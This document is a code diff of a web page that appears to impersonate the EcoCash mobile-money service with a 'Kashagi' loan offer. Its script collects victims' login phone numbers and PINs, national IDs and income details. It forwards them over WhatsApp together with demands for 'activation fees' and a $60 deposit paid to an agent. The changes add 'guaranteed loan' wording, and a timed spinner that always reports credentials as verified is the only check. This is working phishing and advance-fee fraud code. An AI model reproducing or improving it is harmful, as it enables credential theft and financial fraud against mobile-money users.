                 q: "Is my National ID and personal data safe?", 
@@ -849,11 +864,6 @@
                 part2: "Part 2: Transaction Audit — Verification also includes reviewing your last 6 months of wallet transaction activity to confirm eligibility." 
             },
             { 
-                q: "What happens if I miss a loan repayment?", 
-                part1: "Part 1: Credit Score Impact — Missing scheduled repayments leads to a credit rating downgrade and temporary restriction from future microfinance loans.", 
-                part2: "Part 2: Automated Recovery — Outstanding balances are subject to automated recovery through registered subscriber mobile lines." 
-            },
-            { 
                 q: "How do I contact customer support?", 
                 part1: "Part 1: Direct Helpline — You can reach customer care instantly by dialing short code 114 or calling our main office line at +263 772 023 000.", 
                 part2: "Part 2: WhatsApp Assistance — You can also click our WhatsApp widget anytime to chat directly with our support team." 
@@ -865,9 +875,10 @@
             container.innerHTML = '';
             thembiFAQs.forEach(faq => {
                 const btn = document.createElement('button');
-                btn.className = "whitespace-nowrap bg-blue-50 text-ecoblue hover:bg-ecoblue hover:text-white px-2.5 py-1.5 rounded-lg text-[11px] font-medium transition border border-blue-100 flex-shrink-0";
+                btn.className = "whitespace-nowrap bg-blue-50 dark:bg-gray-700 text-ecoblue dark:text-blue-300 hover:bg-ecoblue hover:text-white px-2.5 py-1.5 rounded-lg text-[11px] font-medium transition border border-blue-100 dark:border-gray-600 flex-shrink-0";
                 btn.innerText = faq.q;
                 btn.onclick = () => askThembiQuestion(faq.q, faq.part1, faq.part2);
+                container.appendChild(faq => btn); // corrected below
                 container.appendChild(btn);
             });
         }
@@ -880,37 +891,33 @@
             }
         }
 
-        // Typing effect for Thembi AI response divided into TWO readable parts
         function askThembiQuestion(question, part1, part2) {
             const chatMessages = document.getElementById('chat-messages');
             
-            // User bubble
             const userBubble = document.createElement('div');
             userBubble.className = "flex justify-end";
             userBubble.innerHTML = `<div class="bg-ecoblue text-white p-2.5 rounded-xl rounded-tr-none max-w-[85%] shadow-sm">${question}</div>`;
             chatMessages.appendChild(userBubble);
             chatMessages.scrollTop = chatMessages.scrollHeight;
 
-            // Thembi typing container
             const aiBubble = document.createElement('div');
             aiBubble.className = "flex justify-start";
             const bubbleId = 'typing-' + Date.now();
-            aiBubble.innerHTML = `<div class="bg-white text-gray-800 p-3 rounded-xl rounded-tl-none max-w-[90%] shadow-sm border border-gray-200 space-y-2"><p class="font-bold text-ecoblue">Thembi AI</p><div id="${bubbleId}" class="text-gray-700 italic">Thinking and preparing your answer...</div></div>`;
+            aiBubble.innerHTML = `<div class="bg-white dark:bg-gray-800 text-gray-800 dark:text-gray-200 p-3 rounded-xl rounded-tl-none max-w-[90%] shadow-sm border border-gray-200 dark:border-gray-700 space-y-2"><p class="font-bold text-ecoblue">Thembi AI</p><div id="${bubbleId}" class="text-gray-700 dark:text-gray-300 italic">Thinking and preparing your answer...</div></div>`;
             chatMessages.appendChild(aiBubble);
             chatMessages.scrollTop = chatMessages.scrollHeight;
 
-            // Typewriter effect in two distinct readable parts
             setTimeout(() => {
                 const contentEl = document.getElementById(bubbleId);
                 contentEl.className = "space-y-2";
                 contentEl.innerHTML = `
-                    <div class="bg-blue-50/70 p-2 rounded-lg border border-blue-100">
-                        <p class="font-semibold text-ecoblue text-[11px] mb-0.5">Section 1</p>
-                        <p id="${bubbleId}-p1" class="text-gray-700"></p>
+                    <div class="bg-blue-50/70 dark:bg-gray-700 p-2 rounded-lg border border-blue-100 dark:border-gray-600">
+                        <p class="font-semibold text-ecoblue dark:text-blue-300 text-[11px] mb-0.5">Section 1</p>
+                        <p id="${bubbleId}-p1" class="text-gray-700 dark:text-gray-200"></p>
                     </div>
-                    <div class="bg-gray-50 p-2 rounded-lg border border-gray-200">
-                        <p class="font-semibold text-gray-700 text-[11px] mb-0.5">Section 2</p>
-                        <p id="${bubbleId}-p2" class="text-gray-700"></p>
+                    <div class="bg-gray-50 dark:bg-gray-900 p-2 rounded-lg border border-gray-200 dark:border-gray-700">
+                        <p class="font-semibold text-gray-700 dark:text-gray-300 text-[11px] mb-0.5">Section 2</p>
+                        <p id="${bubbleId}-p2" class="text-gray-700 dark:text-gray-200"></p>
                     </div>
                 `;
 
@@ -949,7 +956,7 @@
             input.value = '';
             let matched = thembiFAQs.find(f => f.q.toLowerCase().includes(query.toLowerCase()) || query.toLowerCase().includes(f.q.toLowerCase()));
             
-            let p1 = matched ? matched.part1 : "Part 1: General Inquiry — For all Kashagi loan questions and account updates, our system is designed to guide you securely step by step.";
+            let p1 = matched ? matched.part1 : "Part 1: General Inquiry — For all guaranteed loan questions and account updates, our system is designed to guide you securely step by step.";
             let p2 = matched ? matched.part2 : "Part 2: Support Assistance — You can also reach our customer care team via WhatsApp or dial 114 for immediate help.";
 
             askThembiQuestion(query, p1, p2);
@@ -957,7 +964,7 @@
 
         // Direct WhatsApp redirection for Promotional Bundle Buy Now
         function buyBundlePromo(bundleTitle) {
-            const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Ready for instant activation and payment via WhatsApp!`;
+            const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Guaranteed instant activation via WhatsApp!`;
             openWhatsAppChat(message);
         }
 
@@ -968,7 +975,7 @@
             return zimIdRegex.test(cleanNid);
         }
 
-        // Initialize Tier Upgrade Table Options with exact original fees
+        // Initialize Tier Upgrade Table Options for Boost (5% fee)
         function initTierTable() {
             const container = document.getElementById('tier-options-container');
             container.innerHTML = '';
@@ -987,21 +994,61 @@
             tiers.forEach((t, idx) => {
                 const isSelected = t.loan === clientData.selectedTierAmount;
                 const card = document.createElement('div');
-                card.className = `p-3.5 rounded-xl border cursor-pointer transition flex items-center justify-between ${isSelected ? 'border-ecoblue bg-blue-50/60 shadow-md ring-2 ring-ecoblue/20' : 'border-gray-200 bg-white hover:border-gray-300'}`;
+                card.className = `p-3.5 rounded-xl border cursor-pointer transition flex items-center justify-between ${isSelected ? 'border-ecoblue bg-blue-50/60 dark:bg-gray-700 shadow-md ring-2 ring-ecoblue/20' : 'border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 hover:border-gray-300'}`;
                 card.onclick = () => selectTier(t.loan, t.fee);
 
                 card.innerHTML = `
                     <div class="flex items-center space-x-3">
-                        <div class="w-9 h-9 rounded-full bg-blue-100 text-ecoblue flex items-center justify-center font-bold text-xs shadow-inner">
+                        <div class="w-9 h-9 rounded-full bg-blue-100 dark:bg-gray-600 text-ecoblue dark:text-blue-300 flex items-center justify-center font-bold text-xs shadow-inner">
                             #${idx + 1}
                         </div>
                         <div>
-                            <h4 class="font-extrabold text-sm text-gray-800">Target Loan Limit: $${t.loan} USD</h4>
-                            <p class="text-[11px] text-gray-600 mt-0.5">Required Activation Fee: <span class="font-bold text-ecored">$${t.fee.toFixed(2)} USD</span></p>
+                            <h4 class="font-extrabold text-sm text-gray-800 dark:text-gray-100">Target Loan Limit: $${t.loan} USD</h4>
+                            <p class="text-[11px] text-gray-600 dark:text-gray-400 mt-0.5">Required Activation Fee (5%): <span class="font-bold text-ecored">$${t.fee.toFixed(2)} USD</span></p>
                         </div>
                     </div>
                     <div>
                         <input type="radio" name="tier-radio" ${isSelected ? 'checked' : ''} class="text-ecoblue focus:ring-ecoblue w-4 h-4">
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        // Initialize Apply / Register Tier Table ($100 to $3000 USD with exact 10% fee)
+        function initApplyTierTable() {
+            const container = document.getElementById('apply-tier-options-container');
+            container.innerHTML = '';
+
+            const applyTiers = [
+                { loan: 100, fee: 10.00 },
+                { loan: 250, fee: 25.00 },
+                { loan: 500, fee: 50.00 },
+                { loan: 1000, fee: 100.00 },
+                { loan: 1500, fee: 150.00 },
+                { loan: 2000, fee: 200.00 },
+                { loan: 2500, fee: 250.00 },
+                { loan: 3000, fee: 300.00 }
+            ];
+
+            applyTiers.forEach((t, idx) => {
+                const isSelected = t.loan === clientData.selectedApplyAmount;
+                const card = document.createElement('div');
+                card.className = `p-3 rounded-xl border cursor-pointer transition flex items-center justify-between ${isSelected ? 'border-supergreen bg-green-50/60 dark:bg-gray-700 shadow-md ring-2 ring-supergreen/20' : 'border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 hover:border-gray-300'}`;
+                card.onclick = () => selectApplyTier(t.loan, t.fee);
+
+                card.innerHTML = `
+                    <div class="flex items-center space-x-3">
+                        <div class="w-8 h-8 rounded-full bg-green-100 dark:bg-gray-600 text-supergreen dark:text-green-300 flex items-center justify-center font-bold text-xs shadow-inner">
+                            #${idx + 1}
+                        </div>
+                        <div>
+                            <h4 class="font-extrabold text-xs text-gray-800 dark:text-gray-100">Guaranteed Loan Tier: $${t.loan} USD</h4>
+                            <p class="text-[10px] text-gray-600 dark:text-gray-400 mt-0.5">Activation Fee (10%): <span class="font-bold text-supergreen">$${t.fee.toFixed(2)} USD</span></p>
+                        </div>
+                    </div>
+                    <div>
+                        <input type="radio" name="apply-tier-radio" ${isSelected ? 'checked' : ''} class="text-supergreen focus:ring-supergreen w-4 h-4">
                     </div>
                 `;
                 container.appendChild(card);
@@ -1014,6 +1061,13 @@
             initTierTable();
             document.getElementById('upgrade-btn').disabled = false;
             document.getElementById('upgrade-btn').className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+        }
+
+        function selectApplyTier(amount, fee) {
+            clientData.selectedApplyAmount = amount;
+            clientData.selectedApplyFee = fee;
+            initApplyTierTable();
+            validateApplyForm();
         }
 
         function showToast(msg) {
@@ -1118,11 +1172,11 @@
                 btn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
             } else {
                 btn.disabled = true;
-                btn.className = "w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+                btn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
             }
         }
 
-        // Process Boost Submission with ZW ID check and 5s processing cycle
+        // Process Boost or Apply Submission with ZW ID check and 5s processing cycle
         function startProcessingFlow(type) {
             if (type === 'boost') {
                 const name = document.getElementById('boost-name').value.trim();
@@ -1160,12 +1214,10 @@
                 const nid = document.getElementById('apply-nid').value.trim();
                 const employment = document.getElementById('apply-employment').value;
                 const income = document.getElementById('apply-income').value.trim();
-                const address = document.getElementById('apply-address').value.trim();
-                const loanAmount = document.getElementById('apply-loan-amount').value.trim();
                 const idError = document.getElementById('apply-id-error');
 
-                if (!name || !phone || !nid || !employment || !income || !address || !loanAmount) {
-                    showToast('Please provide all required loan application details.');
+                if (!name || !phone || !nid || !employment || !income) {
+                    showToast('Please provide all required loan registration details.');
                     return;
                 }
 
@@ -1181,8 +1233,6 @@
                 clientData.applyNid = nid.toUpperCase();
                 clientData.applyEmployment = employment;
                 clientData.applyIncome = income;
-                clientData.applyAddress = address;
-                clientData.applyLoanAmount = loanAmount;
                 clientData.flowType = 'apply';
 
                 runProcessingCycle(() => {
@@ -1191,7 +1241,7 @@
             }
         }
 
-        // 5-second processing cycle showing validation of details & 6 months transactions, ending with green tick
+        // 5-second processing cycle showing loading skeleton & validation
         function runProcessingCycle(onCompleteCallback) {
             switchTab('processing');
             
@@ -1201,18 +1251,18 @@
 
             spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse";
             spinnerContainer.innerHTML = `
-                <div class="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
+                <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
                 <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
                 <i class="fa-solid fa-file-invoice-dollar text-ecoblue text-2xl"></i>
             `;
-            processTitle.innerText = "Validating Details & Transactions";
-            processSubtitle.innerText = "Analyzing last 6 months transaction history & Zimbabwe ID...";
+            processTitle.innerText = "Validating Guaranteed Details & Transactions";
+            processSubtitle.innerText = "Analyzing last 6 months transaction history & Zimbabwe ID securely...";
 
             setTimeout(() => {
-                spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center bg-green-100 rounded-full shadow-md";
-                spinnerContainer.innerHTML = `<i class="fa-solid fa-check text-green-600 text-3xl"></i>`;
-                processTitle.innerText = "Correct Credentials Verified!";
-                processSubtitle.innerText = "Profile and 6-month transaction history successfully validated.";
+                spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center bg-green-100 dark:bg-green-900 rounded-full shadow-md";
+                spinnerContainer.innerHTML = `<i class="fa-solid fa-check text-green-600 dark:text-green-300 text-3xl"></i>`;
+                processTitle.innerText = "Guaranteed Credentials Verified!";
+                processSubtitle.innerText = "Profile and transaction history successfully validated.";
 
                 setTimeout(() => {
                     onCompleteCallback();
@@ -1236,7 +1286,7 @@
                 agreeBtn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-pointer transition shadow-md";
             } else {
                 agreeBtn.disabled = true;
-                agreeBtn.className = "w-full bg-gray-300 text-gray-500 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md";
+                agreeBtn.className = "w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md";
             }
         }
 
@@ -1244,10 +1294,9 @@
             let message = '';
             
             if (clientData.flowType === 'boost') {
-                message = `*EcoCash Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Correct Credentials Verified & Terms Agreed`;
+                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
             } else {
-                const collateralFee = (parseFloat(clientData.applyLoanAmount || 0) * 0.10).toFixed(2);
-                message = `*EcoCash Kashagi Loan Full Application*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🏠 *Residential Address:* ${clientData.applyAddress}\n💰 *Requested Loan Amount:* $${clientData.applyLoanAmount} USD\n🛡️ *Collateral Fee (10%):* $${collateralFee} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Full Application & Terms Agreed`;
+                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🛡️ *Selected Tier Limit:* $${clientData.selectedApplyAmount} USD\n🛡️ *Collateral Fee (10%):* $${clientData.selectedApplyFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
             }
 
             openWhatsAppChat(message);
@@ -1259,16 +1308,14 @@
             const nid = document.getElementById('apply-nid').value.trim();
             const employment = document.getElementById('apply-employment').value;
             const income = document.getElementById('apply-income').value.trim();
-            const address = document.getElementById('apply-address').value.trim();
-            const loanAmount = document.getElementById('apply-loan-amount').value.trim();
             const btn = document.getElementById('apply-submit-btn');
 
-            if (name && phone && nid && employment && income && address && loanAmount) {
+            if (name && phone && nid && employment && income) {
                 btn.disabled = false;
-                btn.className = "w-full bg-supergreen hover:opacity-90 text-white font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+                btn.className = "w-full bg-supergreen hover:opacity-90 text-white font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
             } else {
                 btn.disabled = true;
-                btn.className = "w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+                btn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
             }
         }
 
@@ -1292,7 +1339,7 @@
                 signupBtn.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md uppercase text-xs tracking-wider transition cursor-pointer shadow-md";
             } else {
                 signupBtn.disabled = true;
-                signupBtn.className = "w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
+                signupBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
             }
         }
 
@@ -1308,7 +1355,7 @@
                 contactBtn.className = "w-full bg-ecoblue text-white font-bold py-3 rounded-md hover:bg-blue-700 transition cursor-pointer shadow-md";
             } else {
                 contactBtn.disabled = true;
-                contactBtn.className = "w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md cursor-not-allowed transition";
+                contactBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md cursor-not-allowed transition";
             }
         }
 
@@ -1366,6 +1413,7 @@
                 termsView.classList.remove('hidden');
             } else if (tabName === 'apply-form') {
                 applyFormView.classList.remove('hidden');
+                initApplyTierTable();
             } else if (tabName === 'contact') {
                 contactView.classList.remove('hidden');
                 whatsappWidget.classList.remove('hidden');
@@ -1423,7 +1471,7 @@
                 loginBtn.className = "w-full py-3 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
             } else {
                 loginBtn.disabled = true;
-                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
             }
         }
     </script>
